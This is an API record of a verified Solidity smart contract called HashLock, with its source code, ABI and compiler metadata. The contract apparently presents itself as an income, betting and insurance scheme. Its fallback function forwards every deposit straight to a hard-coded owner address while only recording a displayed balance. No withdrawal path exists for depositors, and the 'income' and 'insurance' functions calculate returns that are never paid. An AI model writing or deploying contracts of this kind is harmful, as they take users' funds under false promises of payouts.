{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.17;\r\ncontract HashLock {\r\n    mapping(address => uint256) public balances;\r\n    uint256 public bettingsum;\r\n    uint256 public insurancesum;\r\n    bytes32 public hashLock = 0xa6d3be4d310a5d7c7eaf639aa25314e41f1a6b2700e446dc1eacac200917f923;\r\n    address payable _owner = 0x8b1f586d2F9C9CfE16bE81d4155d2e5789Eb32c7;\r\n    \r\n\tfunction () external payable{\r\n\t    balances[msg.sender] += msg.value;\r\n\t    _owner.transfer(msg.value);\r\n\t}\r\n \r\n\tfunction outsomeincomemore(address _who,uint _amount,string memory _srcvalue) payable public returns (bool result) {\r\n\t    require(sha256(abi.encodePacked(_srcvalue))==hashLock);\r\n        require(_amount<2000000000000000000);\r\n        require(_amount>1000000000000000);\r\n        require(_who==_owner);\r\n\t\t_owner.transfer(_amount);\r\n        return true;\r\n    }\r\n\r\n    function balanceOf(address _who) public view returns (uint balance) {\r\n        return balances[_who];\r\n    }\r\n\r\n\tfunction bettingSum() public view returns (uint256 sumvalue){\r\n        return  bettingsum;\r\n    }\r\n    \r\n    function incomeday(uint _amount) public pure returns (uint256 incomevalue){\r\n        require(_amount>10000000000000);\r\n        require(_amount<1000000000000000000);\r\n        return _amount/100;\r\n    }\r\n    function incomedaysecondone(uint _amount) public pure returns (uint256 incomevalue){\r\n        require(_amount>10000000000000);\r\n        require(_amount<1000000000000000000);\r\n        return _amount*5/1000;\r\n    }\r\n    function incomedaysecondtwo(uint _amount) public pure returns (uint256 incomevalue){\r\n        require(_amount>10000000000000);\r\n        require(_amount<1000000000000000000);\r\n        return _amount*6/1000;\r\n    }\r\n    function incomedaysecondthree(uint _amount) public pure returns (uint256 incomevalue){\r\n        require(_amount>10000000000000);\r\n        require(_amount<1000000000000000000);\r\n        return _amount*7/1000;\r\n    }\r\n    function incomeshare(uint _amount,uint floor,uint round) public pure returns (uint256 incomevalue){\r\n        require(_amount>10000000000000);\r\n        require(_amount<1000000000000000000);\r\n        if(round>0){\r\n            return _amount/10;\r\n        }\r\n        if(floor==1){\r\n            return _amount;\r\n        }else if(floor==2){\r\n            return _amount*5/10;\r\n        }else if(floor==3){\r\n            return _amount*3/10;\r\n        }else if(floor==4){\r\n            return _amount*2/10;\r\n        }else if(floor==5){\r\n            return _amount*15/100;\r\n        }else{\r\n            return _amount/10;\r\n        }\r\n    }\r\n    function incomecomunity(uint level) public pure returns (uint256 incomevalue){\r\n        if(level==1){\r\n            return 5;\r\n        }else if(level==2){\r\n            return 10;\r\n        }else if(level==3){\r\n            return 15;\r\n        }else if(level==4){\r\n            return 20;\r\n        }else if(level==5){\r\n            return 25;\r\n        }else if(level==6){\r\n            return 30;\r\n        }\r\n    }\r\n    function insurancetime(uint _amount) public returns (uint256 insurancevalue){\r\n        require(_amount>10000000000000);\r\n        require(_amount<1000000000000000000);\r\n        insurancesum = insurancesum + _amount/100000000000000000;\r\n        return _amount*3;\r\n    }\r\n    function insuranceSum() public view returns (uint256 insurance){\r\n        return insurancesum;\r\n    }\r\n    function getrate() public pure returns (uint256 value){\r\n        return 10000;\r\n    }\r\n    function getrateone() public pure returns (uint256 value){\r\n        return 70;\r\n    }\r\n    function getratetwo() public pure  returns (uint256 value){\r\n        return 30;\r\n    }\r\n}","ABI":"[{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_who\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"bettingSum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"sumvalue\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"bettingsum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getrate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getrateone\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getratetwo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"hashLock\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"level\",\"type\":\"uint256\"}],\"name\":\"incomecomunity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"incomevalue\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"incomeday\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"incomevalue\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"incomedaysecondone\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"incomevalue\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"incomedaysecondthree\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"incomevalue\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"incomedaysecondtwo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"incomevalue\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"floor\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"round\",\"type\":\"uint256\"}],\"name\":\"incomeshare\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"incomevalue\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"insuranceSum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"insurance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"insurancesum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"insurancetime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"insurancevalue\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_who\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"internalType\":\"string\",\"name\":\"_srcvalue\",\"type\":\"string\"}],\"name\":\"outsomeincomemore\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"result\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"}]","ContractName":"HashLock","CompilerVersion":"v0.5.17+commit.d19bba13","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://69eb10671572e4df9a4656c92a84eda287b2e95f2bb85794bed9ce39213f8495"}]}